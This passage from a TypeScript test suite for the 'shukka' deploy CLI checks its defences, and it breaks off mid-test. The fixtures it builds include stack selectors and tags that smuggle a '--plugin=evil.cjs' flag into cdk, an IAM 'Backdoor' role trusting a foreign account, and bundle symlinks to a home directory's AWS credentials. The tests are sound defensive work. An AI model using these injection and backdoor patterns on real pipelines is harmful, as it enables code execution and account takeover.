function writeHostileAssembly(out: string, mutate: (artifacts: any, assembly: string) => void) {
  mkdirSync(out, { recursive: true });
  for (const f of ['Demo.template.json', 'evil.cjs']) writeFileSync(join(out, f), readFileSync(join(PLUGIN_FIXTURE, f)));
  const manifest = JSON.parse(readFileSync(join(PLUGIN_FIXTURE, 'manifest.json'), 'utf8').replaceAll('@ASSEMBLY@', out));
  mutate(manifest.artifacts, out);
  writeFileSync(join(out, 'manifest.json'), JSON.stringify(manifest));
}

/** A deploy spawn whose synth writes the security review's hostile assembly, its manifest changed by `mutate`. */
function hostileSynthSpawn(bundle: string, mutate: (artifacts: any, assembly: string) => void) {
  return recordingSpawn(({ cmd, args, options }) => {
    if (cmd === 'npx' && args.includes('synth')) {
      writeHostileAssembly(args[args.indexOf('--output') + 1]!, mutate);
      return { status: 0, stdout: '' };
    }
    if (cmd === process.execPath && args[1] === 'diff') return { status: 0, stdout: CLEAN_DIFF };
    // In the container (shu-9bj.8) the bundle must land inside the checkout.
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return bundleInTree(bundle, options.cwd);
    return { status: 0, stdout: '' };
  });
}

/** shukka's pinned cdk with these arguments, with no way to reach AWS, from an empty directory. */
function offlineCdk(tmp: string, args: string[]) {
  const home = mkdtempSync(join(tmp, 'cdk-home-'));
  const empty = join(home, 'empty');
  writeFileSync(empty, '');
  const env = { PATH: `${dirname(process.execPath)}:/usr/bin:/bin`, HOME: home, AWS_CONFIG_FILE: empty, AWS_SHARED_CREDENTIALS_FILE: empty, AWS_EC2_METADATA_DISABLED: 'true', AWS_ENDPOINT_URL: 'http://127.0.0.1:9', AWS_REGION: 'us-east-1', CDK_DISABLE_VERSION_CHECK: 'true' };
  const r = spawnSync(process.execPath, args, { cwd: home, env, encoding: 'utf8', timeout: 120_000 });
  return `${r.stdout}${r.stderr}`;
}

test('shu-9bj.5: deploy re-checks each stack selector before cdk runs: a displayName --plugin=<path> is refused, nothing deployed', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = hostileSynthSpawn(bundleDir(tmp), () => {});
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn, aws: awsWith(releaseClients()).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1, r.out + r.err);
  assert.match(r.err, /refusing stack selector "--plugin=\S+evil\.cjs"/);
  assert.equal(calls.filter((x) => isCdk(x, 'deploy')).length, 0, 'cdk deploy never ran');
}));

test('shu-9bj.5: deploy passes each tag as one --tags=k=v token; the pinned cdk keeps --tags=--plugin=x as data', withTmp(async (tmp) => {
  const { dir, sha } = consumer(tmp);
  const mutate = (artifacts: any, out: string) => {
    artifacts.Demo.displayName = 'Demo';
    artifacts.Demo.properties.tags = { '--plugin': `${out}/evil.cjs` };
  };
  const { calls, spawn } = hostileSynthSpawn(bundleDir(tmp), mutate);
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn, aws: awsWith(releaseClients()).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.out + r.err);
  const deploys = calls.filter((x) => isCdk(x, 'deploy'));
  assert.equal(deploys.length, 2, 'one cdk deploy per stack (their tags differ)');
  const demo = deploys.find((x) => x.args.includes('Demo'))!;
  const assembly = demo.args[demo.args.indexOf('--app') + 1]!;
  assert.deepEqual(demo.args.slice(demo.args.indexOf('--exclusively')), ['--exclusively', 'Demo', `--tags=--plugin=${assembly}/evil.cjs`, `--tags=shukka:revision=${sha}`]);
  assert.ok(!demo.args.includes('--tags'), 'no tag is split from its flag');
  // The same argv, given to the real pinned cdk offline: it reads the assembly and never loads the plugin. The
  // assembly is written inside the fresh worktree (shu-9bj.8), which deploy removes, so it is written again first.
  writeHostileAssembly(assembly, mutate);
  const out = offlineCdk(tmp, demo.args);
  assert.match(out, /Synthesis time/, out);
  assert.ok(!existsSync(join(assembly, 'MARKER')), `the planted plugin ran:\n${out}`);
}));

// ---------- shu-9bj.6: the policy guard ----------

test('shu-9bj.6: shukka deploy runs the policy guard after the assembly check and before cdk gets a session; --allow-replacement goes ahead', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const backdoor = {
    Resources: {
      Backdoor: {
        Type: 'AWS::IAM::Role',
        Properties: { RoleName: 'shukkatest-backdoor', AssumeRolePolicyDocument: { Statement: [{ Effect: 'Allow', Action: 'sts:AssumeRole', Principal: { AWS: 'arn:aws:iam::999999999999:root' } }] } },
      },
    },
  };
  const synthSpawn = () => recordingSpawn(({ cmd, args }) => {
    if (cmd === 'npx' && args.includes('synth')) {
      const out = args[args.indexOf('--output') + 1]!;
      write(join(out, 'manifest.json'), JSON.stringify({ artifacts: { 'shukkatest-App': { type: 'aws:cloudformation:stack', properties: { templateFile: 'shukkatest-App.template.json', tags: { Project: 'shukkatest' } } } } }));
      write(join(out, 'shukkatest-App.template.json'), JSON.stringify(backdoor));
      return { status: 0, stdout: '' };
    }
    if (cmd === process.execPath && args[1] === 'diff') return { status: 0, stdout: CLEAN_DIFF };
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return { status: 0, stdout: `${bundleDir(tmp)}\n` };
    return { status: 0, stdout: '' };
  });
  let s = synthSpawn();
  let assumed: string[] = [];
  let c = releaseClients();
  const aws = () => awsWith(c, { assumeRole: async (a: string) => { assumed.push(a); return { accessKeyId: 'ASIAFENCED', secretAccessKey: 's', sessionToken: 't' }; } }).aws;
  let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: aws(), checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.out, /policy-guard: shukkatest-App\.template\.json: Backdoor \(AWS::IAM::Role\): trusts AWS arn:aws:iam::999999999999:root/);
  assert.match(r.err, /the policy guard stopped the deploy: .*--allow-replacement/);
  assert.deepEqual(assumed, [], 'no session was made');
  assert.ok(!s.calls.some((x) => isCdk(x, 'diff') || isCdk(x, 'deploy')));
  assert.equal(c.s3.calls.length, 0);

  s = synthSpawn();
  assumed = [];
  c = releaseClients();
  r = await cli(['deploy', '--skip-checks', '--allow-replacement'], { cwd: dir, spawn: s.spawn, aws: aws(), checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, /^policy-guard: allowed by the person who started this run \(--allow\)$/m);
  assert.ok(s.calls.some((x) => isCdk(x, 'deploy')));
}));

// ---------- shu-9bj.8: project code in a container; bootstrap's fence clashes ----------

const PROJECT_STEPS = ['npm test', 'npm ci', 'npm run build', 'bundle.sh', 'infra npm ci', 'cdk synth', 'bash smoke.sh'];

/** Which project step a recorded call is, or undefined for anything else (git, docker info, shukka's cdk, aws). */
function stepOf(c: Call): string | undefined {
  if (c.cmd === 'bash' && c.args[0] === '-eo') return c.args[3];
  if (c.cmd === 'bash' && c.args[0]?.endsWith('/bundle.sh')) return 'bundle.sh';
  if (c.cmd === 'bash' && c.args[0] === '-c') return c.args[1];
  if (c.cmd === 'npm' && c.args[0] === 'ci') return 'infra npm ci';
  if (c.cmd === 'npx' && c.args.includes('synth')) return 'cdk synth';
  return undefined;
}

/** Run `fn` with these variables in this process's environment, then put it back. */
async function withEnv<T>(vars: Record<string, string>, fn: () => Promise<T>): Promise<T> {
  const saved: Record<string, string | undefined> = {};
  for (const k of Object.keys(vars)) saved[k] = process.env[k];
  Object.assign(process.env, vars);
  try {
    return await fn();
  } finally {
    for (const [k, v] of Object.entries(saved)) if (v === undefined) delete process.env[k]; else process.env[k] = v;
  }
}

const CALLER_SECRETS = {
  AWS_PROFILE: 'stelking', AWS_ACCESS_KEY_ID: 'AKIAADMIN', AWS_SECRET_ACCESS_KEY: 'admin-secret', AWS_SESSION_TOKEN: 'admin-token',
  GH_TOKEN: 'gho_caller', GITHUB_TOKEN: 'ghp_caller', NPM_TOKEN: 'npm_caller',
};

test('shu-9bj.8: deploy runs every project step in a throwaway container of the pinned node:22 image, with only the fresh worktree mounted read-write, as the caller, without home or credentials, network allowed', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
  const c = releaseClients();
  const r = await withEnv(CALLER_SECRETS, () => cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS, keepTemp: true }));
  assert.equal(r.code, 0, r.out + r.err);
  assert.match(projectImage(), /^shukka-project:[0-9a-f]{16}$/);

  const steps = calls.filter((x) => stepOf(x) !== undefined);
  assert.deepEqual(steps.map(stepOf), PROJECT_STEPS, 'every project step ran, in order');
  const tree = steps[0]!.options.cwd.replace(/\/app$/, '');
  assert.match(tree, /shukka-tree-[^/]+\/tree$/);
  const allowed = new Set(['HOME', 'CI', 'CDK_DEFAULT_ACCOUNT', 'CDK_DEFAULT_REGION', 'APP_URL', 'LEGAL_ENTITY', 'CONTACT_EMAIL']);
  for (const x of steps) {
    const what = stepOf(x);
    const argv: string[] = x.options.docker;
    assert.ok(argv, `${what} runs in a container`);
    const u = unwrapDocker(argv);
    assert.equal(argv[0], 'run');
    assert.ok(u.flags.includes('--rm'), `${what}: the container is thrown away`);
    assert.equal(u.image, projectImage(), what);
    assert.equal(argv[argv.indexOf('--platform') + 1], 'linux/amd64', what);
    assert.deepEqual(u.mounts, [`type=bind,source=${tree},target=${tree}`], `${what}: only the fresh worktree, read-write`);
    assert.ok(!u.flags.some((f) => ['-v', '--volume', '--volumes-from', '--privileged', '--network', '--net', '--env-host', '--ipc', '--pid'].includes(f)), `${what}: ${u.flags.join(' ')}`);
    assert.equal(argv[argv.indexOf('--user') + 1], `${process.getuid!()}:${process.getgid!()}`, `${what}: files written back are the caller's`);
    assert.ok(u.flags.includes('--cap-drop') && argv[argv.indexOf('--cap-drop') + 1] === 'ALL', what);
    assert.ok(u.cwd === tree || u.cwd.startsWith(`${tree}/`), `${what}: works in the tree (${u.cwd})`);
    assert.equal(u.env.HOME, '/tmp', `${what}: no home directory of the caller`);
    for (const k of Object.keys(u.env)) assert.ok(allowed.has(k), `${what}: ${k} passed into the container`);
    for (const secret of Object.values(CALLER_SECRETS)) assert.ok(!JSON.stringify(u.env).includes(secret) && !argv.join(' ').includes(secret), `${what}: ${secret}`);
    assert.ok(!argv.join(' ').includes(homedir()), `${what}: the caller's home is not on the docker command line`);
    const envFile = argv[argv.indexOf('--env-file') + 1]!;
    assert.equal(statSync(envFile).mode & 0o777, 0o600);
  }
  const build = steps.find((x) => stepOf(x) === 'npm run build')!;
  assert.equal(build.options.fullEnv.LEGAL_ENTITY, 'Example Ltd', 'buildEnv values reach the build');
  assert.ok(!build.options.docker.join(' ').includes('Example Ltd'), 'values go in the env file, not on the command line');

  // shukka's cdk runs on this machine, on the assembly the container wrote inside the tree.
  for (const verb of ['diff', 'deploy']) {
    const x = calls.find((y) => isCdk(y, verb))!;
    assert.ok(x && !x.options.docker, `cdk ${verb} runs on the host`);
    assert.ok(argAfter(x.args.join(' '), '--app').startsWith(`${tree}/.shukka-cdk-`), x.args.join(' '));
  }
  assert.deepEqual(calls.filter((x) => x.cmd === 'docker').map((x) => x.args.slice(0, 2).join(' ')), ['info --format', 'image inspect'], 'nothing else runs docker');
}));

test('shu-9bj.8: diff runs npm ci and cdk synth in the container too', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = deploySpawn(CLEAN_DIFF, '');
  const r = await withEnv(CALLER_SECRETS, () => cli(['diff'], { cwd: dir, spawn, checkAssembly: NO_ASSETS }));
  assert.equal(r.code, 0, r.err);
  const steps = calls.filter((x) => stepOf(x) !== undefined);
  assert.deepEqual(steps.map(stepOf), ['infra npm ci', 'cdk synth']);
  for (const x of steps) {
    assert.ok(x.options.docker, `${stepOf(x)} in a container`);
    assert.equal(x.options.fullEnv.HOME, '/tmp');
    assert.deepEqual(Object.keys(x.options.fullEnv).filter((k) => /^(AWS_|GH_|GITHUB_)/i.test(k)), []);
  }
  assert.match(r.out, new RegExp(`runs in throwaway containers of ${projectImage()}:`));
}));

/** A spawn with no Docker: `docker info` fails (or, with `missing`, there is no docker program at all). */
function noDockerSpawn(missing = false, bundle = '') {
  const s = deploySpawn(CLEAN_DIFF, bundle);
  return {
    calls: s.calls,
    spawn: (cmd: string, args: string[], options: any) => {
      if (cmd === 'docker' && missing) { s.calls.push({ cmd, args, options }); throw new CliError('cannot run docker: spawnSync docker ENOENT'); }
      if (cmd === 'docker' && args[0] === 'info') { s.calls.push({ cmd, args, options }); return { status: 1, stdout: 'Cannot connect to the Docker daemon' }; }
      return s.spawn(cmd, args, options);
    },
  };
}

test('shu-9bj.8: without Docker, diff and deploy refuse before any project code runs, unless --trust-project-code', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  for (const command of ['diff', 'deploy']) {
    for (const missing of [false, true]) {
      const s = noDockerSpawn(missing);
      const r = await cli([command], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
      assert.equal(r.code, 1, `${command}: ${r.out}${r.err}`);
      assert.match(r.err, /refusing: Docker is not available[\s\S]*--trust-project-code/);
      assert.ok(!s.calls.some((x) => stepOf(x) !== undefined || isCdk(x, 'diff') || isCdk(x, 'deploy')), `${command}: nothing ran`);
      assert.equal(git(dir, 'worktree', 'list').split('\n').length, 1, 'the fresh worktree is removed');
    }
  }
  const dry = await cli(['deploy', '--dry-run'], { cwd: dir, spawn: noDockerSpawn().spawn });
  assert.equal(dry.code, 1);
  assert.match(dry.err, /Docker is not available/);
}));

test('shu-9bj.8: --trust-project-code without Docker runs the project steps here, without AWS variables, and diff and deploy print the same clear warning', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const warnings: string[] = [];
  for (const command of ['diff', 'deploy']) {
    const s = noDockerSpawn(false, bundleDir(tmp));
    const c = releaseClients();
    const r = await withEnv(CALLER_SECRETS, () => cli([command, '--trust-project-code', '--skip-checks'].filter((a) => command === 'deploy' || a !== '--skip-checks'), {
      cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS,
    }));
    assert.equal(r.code, 0, r.out + r.err);
    const warning = r.err.split('\n').find((l) => l.includes('--trust-project-code'));
    assert.ok(warning, `${command} warns: ${r.err}`);
    assert.equal(warning, `shukka: warning: ${HOST_CODE_WARNING}`);
    assert.match(warning!, /runs on this machine as you[\s\S]*~\/\.aws[\s\S]*SSO[\s\S]*gh's token/);
    warnings.push(warning!);
    const steps = s.calls.filter((x) => stepOf(x) !== undefined);
    assert.ok(steps.length >= 2, command);
    for (const x of steps) {
      assert.ok(!x.options.docker, `${stepOf(x)} on the host`);
      assert.deepEqual(Object.keys(x.options.fullEnv).filter((k) => /^aws_/i.test(k)).sort(), ['AWS_CONFIG_FILE', 'AWS_EC2_METADATA_DISABLED', 'AWS_SHARED_CREDENTIALS_FILE']);
      assert.equal(readFileSync(x.options.fullEnv.AWS_SHARED_CREDENTIALS_FILE, 'utf8'), '');
      assert.equal(readFileSync(x.options.fullEnv.AWS_CONFIG_FILE, 'utf8'), '');
      assert.equal(x.options.fullEnv.AWS_EC2_METADATA_DISABLED, 'true');
    }
  }
  assert.equal(warnings[0], warnings[1], 'diff and deploy print the same warning');
}));

test("shu-9bj.8: diff's help carries the same project-code paragraph and warning as deploy's, and both take --trust-project-code", () => {
  const diff = COMMANDS.find((c) => c.name === 'diff')!;
  const deploy = COMMANDS.find((c) => c.name === 'deploy')!;
  const paragraph = (summary: string) => summary.slice(summary.indexOf('Project code:'), summary.indexOf(`${HOST_CODE_WARNING}.`) + HOST_CODE_WARNING.length + 1);
  for (const c of [diff, deploy]) {
    assert.ok(c.summary.includes(HOST_CODE_WARNING), `${c.name} help has the warning`);
    assert.ok(c.summary.includes(PROJECT_BASE_IMAGE), `${c.name} help names the pinned base image`);
    assert.ok(!/GitHub's runners/.test(c.summary), 'no claim that the image matches the runners');
    for (const re of [/only the fresh worktree is mounted, read-write/i, /your user and group/, /HOME=\/tmp/, /AWS_, GH_ or\s+GITHUB_/, /network is allowed/,
      /Node 22, npm, npx,\s+bash, git, curl, jq, python3, make, gcc, g\+\+ and ca-certificates/, /--platform linux\/amd64/, /dynamodb-local/, /--skip-checks/, /symbolic link/]) {
      assert.match(paragraph(c.summary), re, c.name);
    }
    assert.ok(c.flags.some((f) => f.name === 'trust-project-code'), `${c.name} takes --trust-project-code`);
    assert.ok(c.usage.includes('--trust-project-code'));
  }
  assert.equal(paragraph(diff.summary), paragraph(deploy.summary));
  assert.ok(helpText().includes(HOST_CODE_WARNING));
});

test('shu-9bj.8: the container gets no credential or home variable, and a bundle printed outside the checkout is refused', withTmp(async (tmp) => {
  const tree = join(tmp, 'tree');
  mkdirSync(tree);
  for (const name of ['AWS_PROFILE', 'aws_session_token', 'GH_TOKEN', 'GITHUB_TOKEN', 'HOME']) {
    assert.throws(() => containerArgs({ image: projectImage(), tree, cwd: tree, env: { [name]: 'x' }, cmd: 'true', args: [] }), /never passed into the project's container/, name);
  }
  assert.throws(() => containerArgs({ image: projectImage(), tree, cwd: tmp, env: {}, cmd: 'true', args: [] }), /outside the checkout/);

  const { dir } = consumer(tmp);
  const outside = bundleDir(tmp);
  const s = recordingSpawn(({ cmd, args }) => (cmd === 'bash' && args[0]?.endsWith('bundle.sh') ? { status: 0, stdout: `${outside}\n` } : { status: 0, stdout: '' }));
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(releaseClients()).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.err, /the bundle script printed .*bundle, outside the checkout/);
}));

// The account as listed for bootstrap: Orbitary's resources (orbitary-prod-*, in Orbitary's stacks), one resource of
// each kind; orb's own data stack; and something unrelated.
const SQS = `https://sqs.us-east-1.amazonaws.com/${ACCOUNT}`;
const SNS = `arn:aws:sns:us-east-1:${ACCOUNT}`;
const ORBITARY = [
  { kind: 'dynamodb-table', name: 'orbitary-prod-posts' },
  { kind: 's3-bucket', name: 'orbitary-prod-media' },
  { kind: 'sqs-queue', name: `${SQS}/orbitary-prod-jobs` },
  { kind: 'sns-topic', name: `${SNS}:orbitary-prod-alerts` },
  { kind: 'lambda-function', name: 'orbitary-prod-worker' },
  { kind: 'log-group', name: '/aws/lambda/orbitary-prod-worker' },
  { kind: 'iam-role', name: 'Orbitary-prod-WorkerRole' },
];

function accountWith(project: string, own: { kind: string; name: string; path?: string }[], ownIds: string[]) {
  return fakeAws({
    accountResources: async () => [...ORBITARY, ...own, { kind: 'dynamodb-table', name: 'trendigle-prod-posts' }, { kind: 'log-group', name: '/ecs/other' }],
    stacksWithTags: async () => [
      { name: 'OrbitaryProd', tags: { Project: 'orbitary' } },
      { name: `${project}-data`, tags: { Project: project } },
      { name: 'Unrelated', tags: {} },
    ],
    stackPhysicalIds: async (name: string) => (name === 'OrbitaryProd'
      ? ['orbitary-prod-posts', 'orbitary-prod-media', `${SQS}/orbitary-prod-jobs`, `${SNS}:orbitary-prod-alerts`, 'orbitary-prod-worker', 'Orbitary-prod-WorkerRole']
      : name === `${project}-data` ? ownIds : []),
  });
}

test('shu-9bj.8: bootstrap orb refuses when orbitary-prod-* tables, buckets, queues, topics, functions, log groups and roles match its fence, before changing anything', withTmp(async (tmp) => {
  const { dir } = consumer(tmp, (c) => { c.project = 'orb'; c.qualifier = 'orb'; c.apps[0].server.units = ['orb-web']; });
  const { calls, spawn } = recordingSpawn();
  const { aws, reads } = accountWith('orb', [{ kind: 'dynamodb-table', name: 'orb-prod-posts' }], ['orb-prod-posts']);
  const r = await cli(['bootstrap', 'orb', '--repo', 'owner/consumer'], { cwd: dir, spawn, aws });
  assert.equal(r.code, 1, r.out + r.err);
  for (const line of [
    'DynamoDB table orbitary-prod-posts', 'S3 bucket orbitary-prod-media', `SQS queue ${SQS}/orbitary-prod-jobs`, `SNS topic ${SNS}:orbitary-prod-alerts`,
    'Lambda function orbitary-prod-worker', 'log group /aws/lambda/orbitary-prod-worker', 'IAM role Orbitary-prod-WorkerRole',
  ]) {
    assert.ok(r.err.includes(`shukka: ${line} matches the fence (orb*, Orb*) but is in no stack of orb`), `${line} in ${r.err}`);
  }
  assert.ok(!r.err.includes('orb-prod-posts '), "orb's own table, in a stack tagged Project=orb, is not a clash");
  assert.ok(!r.err.includes('trendigle'), 'names outside the fence are not listed');
  assert.match(r.err, /7 resource\(s\) in this account \(above\) are named like orb but belong to no stack tagged Project=orb/);
  assert.ok(reads.includes('accountResources()'), 'the account was listed');
  assert.deepEqual(MUTATING(calls), [], 'nothing ran');
}));

test("shu-9bj.8: bootstrap goes ahead when everything in the fence is in the project's own stacks (a function's own log group counts)", withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const own = [
    { kind: 'dynamodb-table', name: 'shukkatest-prod-posts' },
    { kind: 'lambda-function', name: 'Shukkatest-Data-Fn12AB' },
    { kind: 'log-group', name: '/aws/lambda/Shukkatest-Data-Fn12AB' },
    { kind: 'iam-role', name: 'shukkatest-shukka-infra' },
  ];
  const r = await cli(projectArgs(), { cwd: dir, aws: accountWith('shukkatest', own, ['shukkatest-prod-posts', 'Shukkatest-Data-Fn12AB', 'shukkatest-shukka-infra']).aws });
  assert.equal(r.code, 0, r.err);

  // The same resources outside any stack of the project are refused, a role with a path among them.
  const stray = await cli(projectArgs(), {
    cwd: dir,
    aws: accountWith('shukkatest', [...own, { kind: 'iam-role', name: 'admin', path: '/shukkatest-ops/' }], ['shukkatest-prod-posts', 'Shukkatest-Data-Fn12AB', 'shukkatest-shukka-infra']).aws,
  });
  assert.equal(stray.code, 1);
  assert.match(stray.err, /IAM role \/shukkatest-ops\/admin matches the fence/);
}));

test('shu-9bj.8: the CLI help no longer says to run bootstrap in the project root', () => {
  assert.ok(!/project root/i.test(helpText()), 'no "project root" in --help');
  const bootstrap = COMMANDS.find((c) => c.name === 'bootstrap')!;
  assert.match(bootstrap.summary, /reading shukka\.json from --config/);
  assert.match(bootstrap.summary, /DynamoDB table, S3 bucket, SQS queue, SNS topic, Lambda function, log group or IAM role/);
});

// ---------- shu-9bj.8, review 1: symlinked bundles, check services, the project image, the platform ----------

test('shu-9bj.8: a bundle that is, or sits under, a symbolic link out of the checkout is refused and nothing is uploaded', withTmp(async (tmp) => {
  const fakeHome = join(tmp, 'home');
  write(join(fakeHome, '.aws', 'credentials'), '[default]\naws_secret_access_key = caller-secret\n');
  const cases: [string, (cwd: string) => string][] = [
    ['the bundle directory is a link to the home directory', (cwd) => { mkdirSync(join(cwd, '.next'), { recursive: true }); symlinkSync(fakeHome, join(cwd, '.next', 'shukka-bundle')); return join(cwd, '.next', 'shukka-bundle'); }],
    ['a directory above the bundle is a link out', (cwd) => { symlinkSync(fakeHome, join(cwd, '.next')); return join(cwd, '.next', '.aws'); }],
    ['a relative link to the home directory', (cwd) => { mkdirSync(join(cwd, 'out'), { recursive: true }); symlinkSync(relative(join(cwd, 'out'), fakeHome), join(cwd, 'out', 'b')); return join(cwd, 'out', 'b'); }],
  ];
  for (const [i, [name, plant]] of cases.entries()) {
    const sub = join(tmp, String(i));
    mkdirSync(sub);
    const { dir } = consumer(sub);
    const s = recordingSpawn(({ cmd, args, options }) => (cmd === 'bash' && args[0]?.endsWith('bundle.sh') ? { status: 0, stdout: `${plant(options.cwd)}\n` } : { status: 0, stdout: '' }));
    const c = releaseClients();
    const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
    assert.equal(r.code, 1, `${name}: ${r.out}${r.err}`);
    assert.match(r.err, /refusing the bundle .* is a symbolic link/, name);
    assert.equal(c.s3.calls.length, 0, `${name}: nothing uploaded`);
    assert.ok(!s.calls.some((x) => isCdk(x, 'deploy')), `${name}: nothing deployed`);
  }
  // A real directory inside the tree passes; a link whose real path stays inside is still refused (no link at all).
  const tree = realpathSync(mkdtempSync(join(tmp, 'tree-')));
  mkdirSync(join(tree, 'app', 'b'), { recursive: true });
  assert.equal(checkBundlePath(tree, join(tree, 'app', 'b'), 'web'), join(tree, 'app', 'b'));
  symlinkSync(join(tree, 'app', 'b'), join(tree, 'inner'));
  assert.throws(() => checkBundlePath(tree, join(tree, 'inner'), 'web'), /is a symbolic link/);
  assert.throws(() => checkBundlePath(tree, join(tree, 'missing'), 'web'), /does not exist/);
}));

/** The services pipeline.yml's "Start services" step starts: name -> the docker run line's image and published port. */
function workflowServices(): Record<string, { image: string; port: number }> {
  const text = readFileSync(join(root, '.github', 'workflows', 'pipeline.yml'), 'utf8');
  const out: Record<string, { image: string; port: number }> = {};
  for (const m of text.matchAll(/^\s+([a-z0-9-]+)\)\n\s+docker run -d --name \S+ -p (\d+):(\d+) \\\n\s+(\S+)\n/gm)) {
    out[m[1]!] = { image: m[4]!, port: Number(m[3]) };
  }
  return out;
}

test('shu-9bj.8: a check with services runs joined to sibling service containers from the workflows\' images, removed afterwards; an unknown service is refused', withTmp(async (tmp) => {
  assert.deepEqual({ ...SERVICES }, workflowServices(), 'the same services, images and ports as pipeline.yml');

  const { dir } = consumer(tmp, (c) => { c.checks[0].services = ['dynamodb-local']; });
  for (const fails of [false, true]) {
    const s = recordingSpawn(({ cmd, args }) => (cmd === 'bash' && args.includes('npm test') && fails ? { status: 3, stdout: '' } : { status: 0, stdout: '' }));
    const r = await cli(['deploy', '--dry-run'].filter((a) => !fails || a !== '--dry-run'), { cwd: dir, spawn: s.spawn, aws: awsWith(releaseClients()).aws, checkAssembly: NO_ASSETS });
    if (fails) {
      assert.equal(r.code, 1);
      assert.match(r.err, /check unit \(command 1\) failed \(exit 3\)/);
    }
    const docker = s.calls.filter((x) => x.cmd === 'docker');
    const start = docker.find((x) => x.args[0] === 'run' && x.args.includes('--detach'));
    if (!fails) {
      // a dry run prints the service start and stop, runs neither
      assert.equal(start, undefined);
      assert.match(r.out, new RegExp(`docker run --detach --rm --platform linux/amd64 --name shukka-shukkatest-[0-9a-f]{8}-dynamodb-local ${reEscape(SERVICES['dynamodb-local'].image)}   \\[dry run: not run\\]`));
      assert.match(r.out, /docker rm --force shukka-shukkatest-[0-9a-f]{8}-dynamodb-local {3}\[dry run: not run\]/);
      assert.match(r.out, /--network container:shukka-shukkatest-[0-9a-f]{8}-dynamodb-local .* bash -eo pipefail -c 'npm test'/);
      continue;
    }
    assert.ok(start, 'the service was started');
    const name = start!.args[start!.args.indexOf('--name') + 1]!;
    assert.match(name, /^shukka-shukkatest-[0-9a-f]{8}-dynamodb-local$/);
    assert.equal(start!.args.at(-1), SERVICES['dynamodb-local'].image);
    assert.equal(start!.args[start!.args.indexOf('--platform') + 1], 'linux/amd64');
    assert.ok(!start!.args.some((a) => a === '--mount' || a === '-v' || a === '--volume'), 'nothing is mounted into the service');
    const check = s.calls.find((x) => x.cmd === 'bash' && x.args.includes('npm test'))!;
    assert.equal(check.options.docker[check.options.docker.indexOf('--network') + 1], `container:${name}`, 'the check reaches the service on localhost');
    const rm = docker.find((x) => x.args[0] === 'rm');
    assert.deepEqual(rm?.args, ['rm', '--force', name], 'removed even though the check failed');
    assert.ok(s.calls.indexOf(rm!) > s.calls.indexOf(check));
    // the build does not join the service's network
    assert.ok(!s.calls.filter((x) => x.args.includes('npm run build')).some((x) => x.options.docker.includes('--network')));
  }

  const sub = join(tmp, 'unknown');
  mkdirSync(sub);
  const other = consumer(sub, (c) => { c.checks[0].services = ['postgres']; });
  const s = recordingSpawn();
  const r = await cli(['deploy'], { cwd: other.dir, spawn: s.spawn, aws: awsWith(releaseClients()).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.err, /check unit uses service "postgres", which shukka cannot start \(known: dynamodb-local\); run with --skip-checks/);
  assert.ok(!s.calls.some((x) => stepOf(x) !== undefined || (x.cmd === 'docker' && x.args[0] === 'run')), 'nothing ran');
}));

test('shu-9bj.8: project code runs in a shukka-owned image built from scripts/cli/image/Dockerfile on the node:22 index digest, for linux/amd64, rebuilt only when the Dockerfile changes', withTmp(async (tmp) => {
  const dockerfile = readFileSync(PROJECT_DOCKERFILE, 'utf8');
  assert.equal(PROJECT_BASE_IMAGE, 'node:22@sha256:e13726ca604184d7a91fcacab1fc09eefd642dc28e79ac34e85540dd93b78cfb', 'the multi-platform index digest');
  assert.deepEqual(dockerfile.split('\n').filter((l) => l.startsWith('FROM')), [`FROM ${PROJECT_BASE_IMAGE}`]);
  assert.match(dockerfile, /apt-get install -y --no-install-recommends jq curl git ca-certificates/);
  assert.equal(PROJECT_PLATFORM, 'linux/amd64');
  assert.equal(projectImage(), `shukka-project:${createHash('sha256').update(readFileSync(PROJECT_DOCKERFILE)).digest('hex').slice(0, 16)}`);

  const { dir } = consumer(tmp);
  // Missing: built once, before the first container.
  let s = deploySpawn(CLEAN_DIFF, '');
  const missing = recordingSpawn((call) => (call.cmd === 'docker' && call.args[0] === 'image' ? { status: 1, stdout: 'No such image' } : { status: 0, stdout: '' }));
  let r = await cli(['diff'], { cwd: dir, spawn: (cmd: string, args: string[], o: any) => (cmd === 'docker' && args[0] !== 'run' ? missing.spawn(cmd, args, o) : s.spawn(cmd, args, o)), checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.err);
  const builds = missing.calls.filter((x) => x.args[0] === 'build');
  assert.equal(builds.length, 1);
  const b = builds[0]!.args;
  assert.deepEqual(b.slice(0, 7), ['build', '--platform', 'linux/amd64', '--tag', projectImage(), '--file', PROJECT_DOCKERFILE]);
  assert.deepEqual(readdirSync(b[7]!), [], 'an empty build context');
  assert.ok(r.out.indexOf('docker build') < r.out.indexOf('npm ci'), 'built before the first project step');
  // Present: no build.
  s = deploySpawn(CLEAN_DIFF, '');
  r = await cli(['diff'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
